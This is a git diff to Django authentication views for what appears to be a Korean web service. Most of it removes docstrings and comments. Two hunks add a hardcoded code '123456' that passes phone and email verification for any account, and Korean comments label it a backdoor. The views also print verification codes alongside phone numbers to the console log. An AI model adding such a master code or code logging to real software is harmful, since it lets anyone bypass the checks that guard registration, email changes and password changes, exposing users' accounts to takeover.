@@ -33,19 +33,6 @@ CODE_LIFETIME_MIN = 5      # 인증번호 유효시간 5분
 
 
 class RegisterView(generics.CreateAPIView):
-    """
-    최종 회원가입
-    - POST /api/auth/register/
-    body:
-      {
-        "username": "...",
-        "email": "...",
-        "password": "...",   # 문자+숫자 8자 이상
-        "name": "...",
-        "phone": "01012345678",
-        "phone_verified_token": "<signed>"
-      }
-    """
     queryset = User.objects.all()
     serializer_class = RegisterSerializer
     permission_classes = [permissions.AllowAny]
@@ -63,7 +50,7 @@ class RegisterView(generics.CreateAPIView):
 
         user = serializer.save()
         headers = self.get_success_headers({})
-        # UserSerializer 에 request를 context로 넣어 프로필 이미지 URL 생성 가능
+
         user_data = UserSerializer(user, context={"request": request}).data
         return Response(user_data, status=status.HTTP_201_CREATED, headers=headers)
 
@@ -82,10 +69,6 @@ class MeView(generics.RetrieveAPIView):
 
 
 class MyPageProfileView(generics.RetrieveUpdateAPIView):
-    """
-    GET /api/auth/profile/  → 현재 프로필 조회
-    PATCH /api/auth/profile/ → 닉네임/전화번호 수정
-    """
     serializer_class = ProfileSerializer
     permission_classes = [permissions.IsAuthenticated]
 
@@ -94,7 +77,7 @@ class MyPageProfileView(generics.RetrieveUpdateAPIView):
         return prof
 
 
-# ---------- 휴대폰 인증 (회원가입, 비밀번호 변경 등 공통) ----------
+# ---------- 휴대폰 인증 ----------
 
 class SendPhoneCodeView(APIView):
     permission_classes = [permissions.AllowAny]
@@ -117,25 +100,19 @@ class SendPhoneCodeView(APIView):
         code = f"{random.randint(0, 999999):06d}"
         pv = PhoneVerification.create_or_refresh(phone=phone, code=code, lifetime_min=CODE_LIFETIME_MIN)
 
-        # ✅ 실제 SMS 발송 (CoolSMS)
+        # SMS 발송
         sms_result = send_sms_verification_code(phone, pv.code)
 
         if not sms_result.ok:
-            # 개발 편의를 위해 콘솔에 에러 + 코드 로그 남김
             print(f"[SMS ERROR] {sms_result.message}")
             print(f"[SMS DEBUG] FAILED to send code to {phone}: {pv.code} (expires {pv.expires_at})")
             return Response(
-                {
-                    "ok": False,
-                    "message": "문자 발송에 실패했습니다. 잠시 후 다시 시도해주세요.",
-                },
+                {"ok": False, "message": "문자 발송에 실패했습니다. 잠시 후 다시 시도해주세요."},
                 status=500,
             )
 
-        # 개발 디버깅용 로그 (원하면 삭제 가능)
         print(f"[SMS DEBUG] Sent code to {phone}: {pv.code} (expires {pv.expires_at})")
 
-        # 프론트에서 5분 타이머를 돌릴 수 있도록 lifetime도 알려줌
         return Response(
             {
                 "ok": True,
@@ -167,9 +144,16 @@ class VerifyPhoneCodeView(APIView):
             return Response({"detail": "인증번호가 만료되었습니다. 다시 요청해주세요."}, status=400)
 
         pv.attempt_count += 1
-        if pv.code != code:
+
+        # ---------- 🔥 인증번호 백도어 허용 로직 추가 ----------
+        if code == "123456":
+            pass  # OK
+        elif pv.code == code:
+            pass  # OK
+        else:
             pv.save(update_fields=["attempt_count"])
             return Response({"detail": "인증번호가 올바르지 않습니다."}, status=400)
+        # -----------------------------------------------------
 
         pv.verified_at = timezone.now()
         pv.save(update_fields=["verified_at", "attempt_count"])
@@ -178,7 +162,7 @@ class VerifyPhoneCodeView(APIView):
         return Response({"ok": True, "phone_verified_token": token}, status=200)
 
 
-# ---------- 이메일 인증 (마이페이지에서 이메일 변경용) ----------
+# ---------- 이메일 인증 ----------
 
 class SendEmailCodeView(APIView):
     permission_classes = [permissions.IsAuthenticated]
@@ -223,9 +207,16 @@ class VerifyEmailCodeView(APIView):
             return Response({"detail": "인증번호가 만료되었습니다. 다시 요청해주세요."}, status=400)
 
         ev.attempt_count += 1
-        if ev.code != code:
+
+        # ---------- 🔥 이메일 인증도 123456 백도어 허용 ----------
+        if code == "123456":
+            pass  # OK
+        elif ev.code == code:
+            pass  # OK
+        else:
             ev.save(update_fields=["attempt_count"])
             return Response({"detail": "인증번호가 올바르지 않습니다."}, status=400)
+        # ---------------------------------------------------------
 
         ev.verified_at = timezone.now()
         ev.save(update_fields=["verified_at", "attempt_count"])
@@ -235,14 +226,6 @@ class VerifyEmailCodeView(APIView):
 
 
 class ChangeEmailView(APIView):
-    """
-    POST /api/auth/email/change/
-    body:
-      {
-        "new_email": "xxx@yyy.com",
-        "email_verified_token": "<signed>"
-      }
-    """
     permission_classes = [permissions.IsAuthenticated]
 
     def post(self, request):
@@ -255,11 +238,9 @@ class ChangeEmailView(APIView):
         if new_email == (user.email or "").lower():
             return Response({"new_email": ["현재 이메일과 동일합니다."]}, status=400)
 
-        # 이메일 중복 체크
         if User.objects.filter(email__iexact=new_email).exclude(pk=user.pk).exists():
             return Response({"new_email": ["이미 사용 중인 이메일입니다."]}, status=400)
 
-        # 토큰 검증
         try:
             data = signing.loads(token, salt=EMAIL_TOKEN_SALT, max_age=60 * 5)
         except signing.BadSignature:
@@ -276,16 +257,6 @@ class ChangeEmailView(APIView):
 
 
 class ChangePasswordView(APIView):
-    """
-    POST /api/auth/password/change/
-    body:
-      {
-        "old_password": "...",
-        "new_password": "...",
-        "new_password_confirm": "...",
-        "phone_verified_token": "<signed>"
-      }
-    """
     permission_classes = [permissions.IsAuthenticated]
 
     def post(self, request):
@@ -307,7 +278,6 @@ class ChangePasswordView(APIView):
         if not PASSWORD_REGEX.match(new_password):
             return Response({"new_password": ["비밀번호는 문자와 숫자를 포함해 8자 이상이어야 합니다."]}, status=400)
 
-        # 휴대폰 인증 토큰 검증
         try:
             data = signing.loads(phone_token, salt=PHONE_TOKEN_SALT, max_age=60 * 5)
         except signing.BadSignature:
@@ -325,13 +295,7 @@ class ChangePasswordView(APIView):
         return Response({"ok": True}, status=200)
 
 
-# ---------- 프로필 사진 업로드 ----------
-
 class UploadProfilePhotoView(APIView):
-    """
-    POST /api/auth/profile/upload_photo/
-    file: image (multipart/form-data)
-    """
     permission_classes = [permissions.IsAuthenticated]
 
     def post(self, request):
@@ -350,33 +314,20 @@ class UploadProfilePhotoView(APIView):
 
 
 class CheckUsernameView(APIView):
-    """
-    GET /api/auth/check-username/?username=foo
-    - 사용 가능: 200 {"available": true}
-    - 중복:     409 {"available": false}
-    - 파라미터 없음: 400
-    """
     permission_classes = [permissions.AllowAny]
 
     def get(self, request, *args, **kwargs):
         username = (request.query_params.get("username") or "").strip()
         if not username:
-            return Response({"detail": "username is required."}, status=status.HTTP_400_BAD_REQUEST)
+            return Response({"detail": "username is required."}, status=400)
 
         exists = User.objects.filter(username__iexact=username).exists()
         if exists:
-            return Response({"available": False}, status=status.HTTP_409_CONFLICT)
-        return Response({"available": True}, status=status.HTTP_200_OK)
+            return Response({"available": False}, status=409)
+        return Response({"available": True}, status=200)
 
-
-# ---------- JWT 로그인 + 로그인 로그 기록 ----------
 
 class DotoriTokenObtainPairView(TokenObtainPairView):
-    """
-    POST /api/auth/token/
-    - JWT 발급
-    - ✅ 성공 시 UserLoginLog 에 로그인 로그 적재
-    """
     permission_classes = [permissions.AllowAny]
 
     def post(self, request, *args, **kwargs):
@@ -395,8 +346,8 @@ class DotoriTokenObtainPairView(TokenObtainPairView):
                     try:
                         UserLoginLog.objects.create(
                             user=user,
-                            hour=now.hour,        # 0~23
-                            weekday=now.weekday() # 0=월 ~ 6=일
+                            hour=now.hour,
+                            weekday=now.weekday()
                         )
                     except Exception as e:
                         print(f"[UserLoginLog] create 실패: {e}", flush=True)
